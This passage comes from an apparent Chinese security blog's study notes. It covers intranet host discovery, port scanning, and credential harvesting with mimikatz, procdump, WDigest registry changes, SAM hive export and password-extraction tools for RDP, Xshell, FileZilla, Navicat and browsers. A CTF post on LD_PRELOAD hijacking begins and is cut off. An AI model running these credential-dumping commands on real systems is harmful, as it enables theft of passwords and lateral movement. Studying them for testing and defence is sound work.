ICMP 回显请求（ping 请求）。-w 1 指定超时时间为 1 毫秒，-n 1 指定只发送一个 ping 请求。192.168.30.%I 是要 ping 的目标主机的 IP 地址，其中 %I 表示当前迭代的数字。<br><br>| findstr &quot;TTL=&quot;：将前一个命令的输出通过管道传递给 findstr 命令，并使用 &quot;TTL=&quot; 作为过滤条件。findstr 命令用于在输出中查找包含指定文本的行。在这种情况下，它将筛选包含 &quot;TTL=&quot; 的行，因为这是 ICMP 回显响应中的一个标识符。<br><br>/L表示数字类型的循环，除此之外还有下面这些：<br>/F：用于从文件中读取内容进行循环。可以指定要读取的文件路径，并使用特定的分隔符将文件内容拆分成多个部分进行迭代。<br><br>/R：用于递归地在目录结构中进行循环。可以指定一个目录路径，并在指定的目录及其子目录中进行递归遍历。<br><br>/D：用于循环遍历指定目录中的文件夹。<br><br>/IN：用于指定一个字符串列表，将列表中的每个字符串作为循环的一部分进行迭代。<br></code></pre></td></tr></table></figure><p><strong>基于 NetBIOS(网络基本输入&#x2F;输出系统)协议发现存活主机</strong></p><p>NetBIOS 提供 OSI&#x2F;RM的会话层(在TCP&#x2F;IP模型中包含在应用层中)服务，让不同计算机上运行的不同程序可以在局域网中互相连接和共享数据。</p><p>NetBIOS 的工作流程就是正常的机器名解析、查询、应答的过程。在 Windows 中，默认安装 TCP&#x2F;IP 后会自动安装 NetBIOS。</p><p>在实际利用时，向局域网的每个IP地址发送NetBIOS状态查询，可以获得主机名MAC 地址等信息。</p><blockquote><p>NBTScan 是一款用于扫描 Windows 网络上NetBIOS 名称的程序,用于发现内网中存活的 Windows 主机。NBTScan 可以对给定IP范围内的每个IP地址发送 NetBIOS 状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，会列出它的IP地址NetBIOS计算机名、登录用户名和MAC地址。工具地址：<a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p></blockquote><p>将工具上传到主机之后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nbtscan 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745105.png" alt="image-20240324212209943"></p><p><strong>基于UDP发现存活主机</strong></p><p>在实际利用中，可以将一个空的UDP报文发送到目标主机的特定端口，如果目标主机的端口是关闭的，UDP探测就马上得到一个ICMP端口无法到达的回应报文，这意味着该主机正在运行。如果到达一个开放的端口，大部分服务仅仅忽略这个空报文而不做任何回应。</p><p>Unicornscan 是Kali Linux平台的一款信息收集工具，提供了网络扫描功能。执行以下命令，通过 UDP协议扫描内网的存活主机</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">unicornscan -mU 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745106.png" alt="image-20240324212621176"></p><p><strong>基于ARP发现存活主机</strong></p><p>在实际利用中，可以向网络发送一个ARP请求，若目标主机处于活跃状态，则其一定会回应一个 ARP 响应，否则不会做出任何回应。</p><ul><li>利用ARP-Scan</li></ul><p>ARP-Scan 是一款快速、便捷的内网扫描工具，利用 ARP 发现内网中存活的主机。将工具上传到目标主机，执行以下命令，即可扫描内网中存活的主机。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">arp-scan -t 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745107.png" alt="image-20240324213635193"></p><ul><li>利用powershell</li></ul><p>Empire 渗透框架的 Invoke-ARPScan.psl脚本可利用 ARP发现内网存活主机，工具地址：<a href="https://github.com/EmpireProject/Empire%E3%80%82(%E6%9A%82%E6%97%B6%E4%B8%8D%E4%BC%9A%E7%94%A8%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%B2%A1%E6%89%BE%E5%88%B0powershell%E8%84%9A%E6%9C%AC%EF%BC%8C%E5%A5%BD%E5%83%8F%E6%98%AF%E5%B7%B2%E7%BB%8F%E5%8F%96%E6%B6%88%E4%BA%86%EF%BC%8C%E6%8A%8A%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E6%94%BE%E8%BF%99)%E4%BD%BF%E7%94%A8%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%B0%86%E8%84%9A%E6%9C%AC%E5%AF%BC%E5%85%A5%E6%89%A7%E8%A1%8C">https://github.com/EmpireProject/Empire。(暂时不会用，因为没找到powershell脚本，好像是已经取消了，把使用命令放这)使用时，需要将脚本导入执行</a>:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-ARPScan.ps1<br>Invoke-ARPScan -CIDR 192.168.30.1/24<br></code></pre></td></tr></table></figure><p><strong>基于 SMB(Server Message Block，服务器消息块)协议发现存活主机</strong></p><p>SMB 又称为网络文件共享系统(CommonInternetFileSystem，CIFS)协议，是一种应用层传输协议，主要功能是使网络上的机器能够共享计算机文件、打印机、串行端口和通信等资源。CIFS 消息一般使用 NetBIOS 或 TCP 发送，分别使用139或 445 端口目前倾向于使用 445 端口。</p><p>在实际利用中，可以探测局域网中存在的SMB 服务，从而发现内网的存活主机，多适用于 Windows 主机的发现。</p><p>CrackMapExec(简称CME)是一款十分强大的后渗透利用工具，在KaliLinux上可以直接使用 apt-get命令进行安装。CrackMapExec能够枚举登录用户、枚举SMB服务列表、执行 WINRM 攻击等功能，可以帮助测试人员自动化评估大型域网络的安全性.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">crackmapexec smb 192.168.30.1/24<br></code></pre></td></tr></table></figure><p>我的kali不在同一个网络检测不了，检测出来的效果如下：</p><p><img src="http://cdn.clown2024.cn/202407151745108.png" alt="image-20240324215607566"></p><h2><span id="内网端口扫描">内网端口扫描</span></h2><p>端口扫描就是用于探测主机开启了哪些服务，从而查找相应的漏洞进行攻击</p><p><strong>利用Telnet探测端口</strong></p><p>Telnet 是进行远程登录的标准协议和主要方式,为用户提供了在本地计算机上完成远程主机工作的能力。telnet命令可以简单测试指定的端口号是正常打开还是关闭状态。</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745109.png" alt="image-20240324221045451"></p><p><strong>利用nmap进行端口扫描</strong></p><p>Nmap 是一个十分强大的端口扫描工具,在实际利用中可以借助内网代理对内网主机进行端口扫描。nmap的使用需要好好去学习，到时查查资料学习。</p><p>下面是一些常用的扫描命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap -p 80,88,135,139,443,8080,3306,3389 172.25.87.14 #扫描目标主机的指定端口<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745110.png" alt="image-20240324221409497"></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">namp -sS -p 1-65535 172.25.87.14 #扫描目标主机的全部端口<br><br>nmap -sC -sV -p 80,88,135,139,443,8080,3306,3389 10.10.10.11 #扫描并获取目标主机指定端口上开放的服务版本<br></code></pre></td></tr></table></figure><p><strong>利用PowerShell进行端口扫描</strong></p><p>NiShang 是基于PowerShell 的渗透测试专用框架，集成了各种脚本和Payload，广泛用于渗透测试的各阶段。<br>NiShang 的 Scan 模块中也有一个 Invoke-PortsCan.ps1 脚本，可以用来对主机进行端口扫描，工具地址：<a href="https://github.com/samratashok/nishang%E3%80%82">https://github.com/samratashok/nishang。</a></p><p><img src="http://cdn.clown2024.cn/202407151745111.png" alt="image-20240324222008156"></p><p>执行下面命令对内网的一个主机范围执行默认的端口扫描，这里要先用管理员权限修改成可以执行脚本策略，然后导入模块再使用</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Import-Module .\Invoke-PortScan.ps1<br>Invoke-PortScan -StartAddress 192.168.30.10 -EndAddress 192.168.30.20 -ResolveHost -ScanPort<br><span class="hljs-meta prompt_">#</span><span class="language-bash">还可以在后面再加上一个-Port选项指定扫描端口</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745112.png" alt="image-20240324223527832"></p><p><strong>利用MetaSploit探测内网</strong></p><p>MetaSploit 渗透框架中内置了几款资源收集模块，可用于发现内网存活主机、探测内网服务、对目标主机进行端口扫描，如图：</p><p><img src="http://cdn.clown2024.cn/202407151745113.png" alt="image-20240324223901678"></p><p><strong>获取端口Banner信息</strong></p><p>Banner 中可能包含一些敏感信息。通过查看端口的Banner，测试人员往往可以获取软件开发商、软件名称、服务类型、版本号等信息，根据不同的服务，可以制订不同的攻击方案，而服务的版本号有时会存在公开的漏洞可以被利用。</p><ul><li><p>利用NetCat获取端口Banner</p><p>Netcat 是一款常用的测试工具和黑客工具，使用 NetCat 可以轻易建立任何连接，具有“瑞士军刀”的美誉。</p><p>通过-nv选项可以在连接端口时获取该端口的Banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nc -nv &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745114.png" alt="image-20240324225257083"></p></li><li><p>利用Telnet获取端口Banner</p><p>如果目标端口开放，使用Telnet连接后，也会返回相应的Banner信息.</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">telnet &lt;IP&gt; &lt;Port&gt;<br></code></pre></td></tr></table></figure></li><li><p>利用Nmap获取端口Banner</p><p>在Nmap中指定脚本**–script&#x3D;banner**就可以在扫描中获取端口的banner信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">nmap --script=banner -p &lt;Ports&gt; &lt;IP&gt;<br></code></pre></td></tr></table></figure></li></ul><h1><span id="用户凭据收集">用户凭据收集</span></h1><p>在内网渗透中，当测试人员获取某台机器的控制权后，会以被攻陷的主机为跳板进行横向渗透，进一步扩大所掌控的资源范围。但是横向渗透中的很多攻击方法都需要先获取到域内用户的密码或哈希值才能进行，如哈希传递攻击、票据传递攻击等。所以在进行信息收集时，要尽可能收集域内用户的登录凭据等信息</p><h2><span id="获取域内单机密码和哈希值">获取域内单机密码和哈希值</span></h2><blockquote><p>在 Windows中,SAM文件是 Windows用户的账户数据库,位于系统的%SystemRoot%System32\Config 目录中，所有本地用户的用户名、密码哈希值等信息都存储在这个文件中。用户输入密码登录时，用户输入的明文密码被转换为哈希值，然后与SAM文件中的哈希值对比，若相同，则认证成功。</p><p>lsass.exe是Windows的一个系统进程，用于实现系统的安全机制，主要用于本地安全和登录策略。在通常情况下，用户输入密码登录后，登录的域名、用户名和登录凭据等信息会存储在lsass.exe的进程空间中，用户的明文密码经过 WDigest和 Tspkg模块调用后,会对其使用可逆的算法进行加密并存储在内存中。</p><p>用来获取主机的用户密码和哈希值的工具有很多,这些工具大多是通过读取 SAM 文件或者访问 lsass.exe 进程的内存数据等操作实现的。这些操作大多需要管理员权限，这意味着需要配合一些提权操作。</p></blockquote><p>下面利用Mimikatz工具来进行学习，Mimikatz是一款功能强大的凭据转储开源程序，可以帮助测试人员提升进程权限、注入进程、读取进程内存等，广泛用于内网渗透测试领域</p><p><strong>在线读取lsass进程内存</strong></p><p>将mimikatz上传到主机执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；sekurlsa::logonpasswords用于导出用户凭据</span><br></code></pre></td></tr></table></figure><p>可直接从lsass.exe进程的内存中读取当前已登录用户的凭据</p><p><img src="http://cdn.clown2024.cn/202407151745115.png" alt="image-20240324232522666"></p><p>不过我这里失败了不知道为什么，成功的话应该是下面这样</p><p><img src="http://cdn.clown2024.cn/202407151745116.png" alt="image-20240324233242439"></p><p>后来试了一下需要管理员权限，那应该是提权之后的事情了这一步</p><p><img src="http://cdn.clown2024.cn/202407151745117.png" alt="image-20240324233522901"></p><p><strong>离线读取lsass内存文件</strong></p><p>除了在线读取，也可以直接将Isass.exe的进程内存转储，将内存文件导出到本地后使用 Mimikatz 进行离线读取。用于转储进程内存的工具有很多，如 OutMinidump.ps1、Procdump、SharpDump等，甚至可以手动加载系统自带的comsvcs.dll 来实现内存转储。</p><p>这里用微软官方提供的Procdump工具，首先要在主机上传该程序，然后执行下面命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">procdump.exe -accepteula -ma lsass.exe lsass.dmp #将lsass.exe的进程转储<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745118.png" alt="image-20240324234127358"></p><p>然后再执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot; &quot;sekurlsa::logonpasswords full&quot; exit<br><span class="hljs-meta prompt_"># </span><span class="language-bash">sekurlsa::minidump lsass.dmp用于加载内存文件；sekurlsa::logonpasswords用于导出用户凭据； full 参数表示要输出全部可用的明文凭据信息，包括密码等详细信息；<span class="hljs-built_in">exit</span> 参数表示退出 Mimikatz 工具，结束当前会话。</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745119.png" alt="image-20240324234639154"></p><blockquote><p>注意,为了防止用户的明文密码在内存中泄露,微软在2014年5月发布了KB2871997补丁，关闭了 WDigest 功能，禁止从内存中获取明文密码，且 Windows Server 2012 及以上版本默认关闭 WDigest 功能。但是测试人员通过修改注册表，可以重新开启 WDigest功能，当用户注销或者重新登录后，就可以重新获取到用户的明文密码。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">开启WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br><span class="hljs-meta prompt_"># </span><span class="language-bash">关闭WDigest</span><br>reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f<br></code></pre></td></tr></table></figure><p><strong>在线读取SAM文件</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot; exit<br><span class="hljs-meta prompt_">#</span><span class="language-bash">privilege::debug用于提升至DebugPrivilege权限；token::elevate用于提升至SYSTEM权限；用于读取本地的SAM文件</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745120.png" alt="image-20240325001115648"></p><p>读取 SAM 文件中保存的用户登录凭据，可以导出当前系统中所有本<br>地用户的哈希值。</p><p><strong>离线读取SAM文件</strong></p><p>离线读取就是将SAM文件导出，再用mimikatz来读取。不过为了提高 SAM 文件的安全性以防止离线破解，Windows 会对 SAM 文件使用密钥进行加密，这个密钥存储在 SYSTEM 文件中，与 SAM 文件位于相同目录下。</p><p>因为系统在运行时，这两个文件是被锁定的，所以需要借助一些工具来实现，而PowerSploit 项目中提供的Invoke-NinjaCopy.ps1脚本可以完成这项工作</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SAM<br><br>Invoke-NinjaCopy -Path &quot;C:\Windows\System32\config\SAM&quot; -LocalDestination C:\Temp\SYSTEM<br></code></pre></td></tr></table></figure><blockquote><p>此外如果能够提权，测试人员可以直接读取SAM和SYSTEM</p></blockquote><p>还可以在管理员权限下通过保存注册表的方式导出</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">reg save HKLM\SAM sam.hive<br>reg save HKLM\SYSTEM system.hive<br></code></pre></td></tr></table></figure><p>然后将导出的两个文件使用mimikatz加载并读取sam中的用户凭据信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mimikatz.exe &quot;lsadump::sam /sam:sam.hive /system:system.hive&quot; exit<br></code></pre></td></tr></table></figure><h2><span id="获取常见应用软件凭据">获取常见应用软件凭据</span></h2><p>为了扩大可访问的范围，测试人员通常会搜索各种常见的密码存储位置，以获取用户凭据。一些特定的应用程序可以存储密码，以方便用户管理和维护，如Xmanager、TeamViewer、FileZilla、NaviCat和各种浏览器等。通过对保存的用户凭据进行导出和解密，测试人员通常可以获取登录内网服务器和各种管理后台的账号密码，可以通过它们进行横向移动和访问受限资源。</p><p><strong>获取RDP保存的凭据</strong></p><p>为了避免每次连接服务器都进行身份验证，经常使用RDP远程桌面连接远程服务器的用户可能勾选保存连接凭据，以便进行快速的身份验证。这些凭据都使用数据保护API以加密形式存储在 Windows 的凭据管理器中，路径为%USERPROFILE%\AppData\LocalMicrosoft\Credentials </p><blockquote><p>%USERPROFILE%即为C:\Users&lt;用户名&gt;</p></blockquote><p>下面命令可以查看当前主机上保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">cmdkey /list #查看当前保存的凭据<br>dir /a %USERPROFILE%\AppData\LocalMicrosoft\Credentials\* #遍历Credentials下保存的所有凭据<br></code></pre></td></tr></table></figure><p>我这里没有凭据所以就借助书中的图来记录，我们可以看到两个历史凭据</p><p><img src="http://cdn.clown2024.cn/202407151745121.png" alt="image-20240325003242224"></p><p>然后用mimikatz来导出指定RDP连接凭据，执行下面命令解析连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C&quot;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745122.png" alt="image-20240325003535797"></p><p><img src="http://cdn.clown2024.cn/202407151745123.png" alt="image-20240325003553911"></p><p><img src="http://cdn.clown2024.cn/202407151745124.png" alt="image-20240325003606845"></p><p>上图中得到的 pbData就是凭据的加密数据，guidMasterKey 是该凭据的 GUID，记录 guidMasterKey 的值。然后执行以下命令:</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa:dpapi&quot; exit<br></code></pre></td></tr></table></figure><p>找到与 guidMasterKey(GUID)相关联的MasterKey，这个MasterKey就是加密凭据所使用的密钥。</p><p><img src="http://cdn.clown2024.cn/202407151745125.png" alt="image-20240325003915323"></p><p>记录结果中的MasterKey值，最后执行下面命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">mimikatz.exe &quot;dpapi::cred /in:%USERPROFILE%\AppData\LocalMicrosoft\Credentials\2B23BCADBE2FAD8EA21E6E9F0516772C/masterkey:&lt;刚刚记录的masterkey的值&gt;&quot; exit<br></code></pre></td></tr></table></figure><p>最后成功解密得到RDP明文凭据</p><p><img src="http://cdn.clown2024.cn/202407151745126.png" alt="image-20240325004214310"></p><p><strong>获取Xshell保存的凭据</strong></p><p>Xshell 会将服务器连接信息保存在Session目录下的.xsh 文件中，路径如表 如下图。如果用户在连接时勾选了“记住用户名&#x2F;密码”，该文件会保存远程服务器连接的用户名和经过加密后的密码。</p><p><img src="http://cdn.clown2024.cn/202407151745127.png" alt="image-20240325004349401"></p><p>Xshell 7 前的版本，测试人员可以直接通过 SharpDecryptPwd 工具进行解密，包括Navicat、TeamViewer、FileZilla、WinSCP和Xmangager 系列产品，工具地址：<a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p><p>将工具上传到主机，执行下面命令可以直接获取Xshell保存的所有连接凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -Xmangager -p &quot;%USERPROFILE%\Documents\NetSarang Computer 6\Xshell\Sessions&quot;<br></code></pre></td></tr></table></figure><p>Xshell 7后的版本，Session目录中不再存储用户密码，用上述方法获取的密码为一串乱码，只能使用星号密码查看器直接查看密码.</p><p><strong>获取FileZilla保存的凭据</strong></p><p>FileZilla 是一款快速的、可依赖的、开源的 FTP 客户端软件，具备大多数 FTP 软件功能。FileZila会将所有FTP登录凭据以Base64密文的格式保存在%USERPROFILE%\AppData\Roaming\FileZilla\recentservers.xml文件中,如图所示。</p><p>由图可知<user>节点记录了 FTP 登录用户,<pass>节点记录了 Base64 加密后的用户密码，将加密的FTP密码解码即可。</pass></user></p><p><img src="http://cdn.clown2024.cn/202407151745128.png" alt="image-20240325004912460"></p><p>使用SharpDecryptPwd执行下面命令可以一键导出FileZilla保存的FTP登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -FileZilla<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745129.png" alt="image-20240325005038300"></p><p><strong>获取NaviCat保存的凭据</strong></p><p>用户连接数据库时，需要填写相关信息，如IP、用户名、密码等。用户选择保存密码(默认勾选)后，Navicat将把这些信息保存到注册表中，具体路径如下表</p><table><thead><tr><th>数据库类型</th><th>凭据存储路径(注册表)</th></tr></thead><tbody><tr><td>Mysql</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MariaDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>MongoDB</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQL SERVER</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>Oracle</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>PostgreSQL</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\&lt; Connetion Name&gt;</td></tr><tr><td>SQLite</td><td>HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\&lt; Connetion Name&gt;</td></tr></tbody></table><p>数据库的连接记录中的Pwd键的值为经过Navicat&lt;&#x3D;11版本算法加密过后的密码，可以在网上搜索解密脚本解出。</p><p>也可以直接使用 Navicat 导出所有连接，将生成connections.ncx 文件，保存所有连接记录。其中，“Password”对应的值即使用 Navicat&gt;&#x3D;12 版本算法加密过后的密码，再对其进行解密。</p><p>下面命令可以一键导出当前主机上用户连接过的所有数据库的登录凭据</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">SharpDecryptPwd.exe -NavicatCrypto<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151745130.png" alt="image-20240325010347363"></p><p><strong>获取浏览器保存的登陆凭据</strong></p><p>Web 浏览器通常会保存网站用户名和密码等凭据，以避免多次手动输入。通常，用户的凭据以加密格式存储在本地文件中，测试人员可以通过读取特定的文件，从Web 浏览器中获取凭据。</p><p>HackBrowserData 是一款开源工具，可以直接从浏览器解密数据包括用户登录密码书签、Cookie、历史记录、信用卡、下载链接等，支持流行的浏览器，可在 Windows、macOS 和 Linux平台上运行，工具地址：<a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></p><p>只需将 HackBrowserData 上传到目标主机，然后直接运行即可，执行完毕后，会在当前目录下生成一个 result 目录，包含当前主机中已安装的所有浏览器保存的用户登录密码、浏览器书签、Cookie、历史记录等信息的 CSV 文件。</p><p><img src="http://cdn.clown2024.cn/202407151745131.png" alt="image-20240325005731788"></p><p>用excel打开就可以看到解密出来的所有登陆凭据</p><p><strong>获取WinSCP保留的登陆凭据</strong></p><p>WinSCP是Windows环境下使用SSH的开源图形化SFTP 工具客户端。在使用SFTP连接时，如果勾选了“保存密码”，WinSCP就会将密码保存在WinSCP.ini文件下。Winscppwd工具则可以进行解密。</p><p><img src="http://cdn.clown2024.cn/202407151745132.png" alt="image-20240325005905488"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfhub的disable_function</title>
      <link href="/2024/03/11/ctfhub%E7%9A%84disable-function/"/>
      <url>/2024/03/11/ctfhub%E7%9A%84disable-function/</url>
      
        <content type="html"><![CDATA[<p><strong>这是ctfhub的Bypass disable_function知识体系</strong></p><p><img src="http://cdn.clown2024.cn/202407151439635.png" alt="image-20240311235539559"></p><p>好多新东西能学的，来研究一下。</p><h1><span id="ld_preload">LD_PRELOAD</span></h1><p><strong>这里首先来了解一下动态链接库(也叫共享库)，这部分在深入理解计算机系统这本书有详细说明，这里简单了解一下</strong></p><p><strong>共享库</strong>（shared library）是致力于解决静态库缺陷的一个现代创新产物。共享库是一个目标模块，在运行或加载时，可以加载到任意的内存地址，并和一个在内存中的程序链接起来。这个过程称为<strong>动态链接</strong>（dynamic linking），是由一个叫做<strong>动态链接器</strong>（dynamic linker）的程序来执行的。共享库也称为<strong>共享目标</strong>（shared object），在 Linux 系统中通常用 .so 后缀来表示。微软的操作系统大量地使用了共享库，它们称为 DLL（动态链接库）。</p><p>程序编译的四个过程如图(预处理、编译、汇编、链接)：</p><p><img src="http://cdn.clown2024.cn/202407151439637.png" alt="image-20240312001644436"></p><p>一个示例程序的动态链接的过程如图：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;vector.h&quot;</span></span><br><br><span class="hljs-type">int</span> x[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br><span class="hljs-type">int</span> y[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">int</span> z[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    addvec(x, y, z, <span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;z = [%d %d]\n&quot;</span>, z[<span class="hljs-number">0</span>], z[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151439638.png" alt="image-20240312001800286"></p><p>这里介绍一个<strong>ldd命令</strong>，该命令的作用是：打印程序或者库文件所依赖的共享库列表</p><p>这是一个示例程序：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;string&gt; msg &#123;<span class="hljs-string">&quot;Hello&quot;</span>, <span class="hljs-string">&quot;C++&quot;</span>, <span class="hljs-string">&quot;World&quot;</span>, <span class="hljs-string">&quot;from&quot;</span>, <span class="hljs-string">&quot;VS Code&quot;</span>, <span class="hljs-string">&quot;and the C++ extension!&quot;</span>&#125;;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> string&amp; word : msg)<br>    &#123;<br>        cout &lt;&lt; word &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们用ldd去看下编译生成的程序所依赖的库</p><p><img src="http://cdn.clown2024.cn/202407151439639.png" alt="image-20240312002417051"></p><p><strong>知道上面的基础东西之后，就来看一下LD_PRELOAD</strong></p><blockquote><p> LD_PRELOAD是Linux中的一个环境变量，它允许你定义在程序运行前优先加载的动态链接库，那么我们便可以在自己定义的动态链接库中装入恶意函数。</p><p>那我们就可以利用ld_preload去劫持函数来达到我们执行恶意代码的目的，比如一个文件中有一个恶意构造的函数和我们程序指令执行时调用的函数一模一样，而LD_PRELOAD路径指向这个文件后，这个文件的优先级高于原本函数的文件，那么优先调用我们的恶意文件后会覆盖原本的那个函数，最后当我们执行了一个指令后它会自动调用一次恶意的函数，也是用自己写的恶意的so文件去覆盖。</p></blockquote><p><strong>这里用一个随机数函数的劫持来演示一下</strong></p><p>生成随机数的代码：</p><figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;time.h&gt;</span> </span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>srand(time(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机生成种子，保证每次出现的随机数不相同</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">while</span>(i--) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,rand());<br>    <span class="hljs-keyword">return</span> <span 